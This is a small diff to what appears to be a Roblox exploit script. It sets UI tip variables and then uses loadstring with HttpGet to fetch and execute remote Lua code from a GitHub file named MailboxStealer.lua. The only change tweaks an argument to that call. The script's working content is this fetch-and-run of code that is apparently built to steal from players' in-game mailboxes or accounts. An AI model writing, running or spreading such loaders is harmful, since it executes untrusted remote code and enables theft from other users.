@@ -22,4 +22,4 @@ _G.Tip4 = "4" --// Gives You Tips On The UI
 _G.Tip5 = "5" --// Gives You Tips On The UI
 
 --[[ Script ]]
-loadstring(game:HttpGet("https://raw.githubusercontent.com/HerrSimoNHub/api/main/MailboxStealer.lua", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HerrSimoNHub/api/main/MailboxStealer.lua"))()
